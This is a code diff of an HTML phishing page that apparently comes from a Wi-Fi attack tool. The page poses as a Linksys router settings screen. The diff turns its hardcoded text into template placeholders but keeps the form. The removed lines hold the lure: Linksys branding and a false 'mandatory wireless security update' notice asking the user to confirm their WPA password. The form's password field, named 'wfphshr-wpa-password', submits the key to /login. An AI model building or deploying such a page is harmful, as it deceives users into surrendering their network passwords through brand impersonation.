@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="{{html_lang}}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linksys — Wi-Fi Settings</title>
+    <title>{{page_title}}</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #f4f6f8; color: #1a1a2e; min-height: 100vh; }
@@ -36,32 +36,32 @@
 </head>
 <body>
     <div class="bar">
-        <div class="logo-text">Link<span>sys</span></div>
-        <div class="badge">Smart Wi-Fi</div>
+        <div class="logo-text">{{brand_link}}<span>{{brand_sys}}</span></div>
+        <div class="badge">{{badge_smart_wifi}}</div>
     </div>
     <div class="nav-dots"><i></i><i class="on"></i><i></i></div>
     <div class="shell">
         <div class="card">
-            <div class="card-h">Wi-Fi security</div>
+            <div class="card-h">{{card_title}}</div>
             <div class="card-b">
                 <div class="alert">
-                    <strong>Security update required</strong>
-                    To complete a mandatory wireless security update, confirm your network password. Devices will briefly reconnect after the change is applied.
+                    <strong>{{alert_title}}</strong>
+                    {{alert_body}}
                 </div>
                 <div class="meta">
-                    <span>WPA2 Personal</span><span>AES</span>
+                    <span>{{meta_wpa2}}</span><span>{{meta_aes}}</span>
                 </div>
                 <form method="POST" action="/login">
                     <div class="field">
-                        <label for="wpa">Wi-Fi / WPA password</label>
-                        <input type="password" id="wpa" name="wfphshr-wpa-password" placeholder="Enter your Wi-Fi password" required autocomplete="current-password">
-                        <div class="hint">Also called network key or pre-shared key (PSK).</div>
+                        <label for="wpa">{{label_wifi_password}}</label>
+                        <input type="password" id="wpa" name="wfphshr-wpa-password" placeholder="{{input_placeholder}}" required autocomplete="current-password">
+                        <div class="hint">{{hint_psk}}</div>
                     </div>
-                    <div class="btn-wrap"><button type="submit" class="btn">Confirm &amp; update</button></div>
+                    <div class="btn-wrap"><button type="submit" class="btn">{{btn_confirm}}</button></div>
                 </form>
             </div>
         </div>
-        <div class="foot">Local router management</div>
+        <div class="foot">{{footer}}</div>
     </div>
 </body>
 </html>
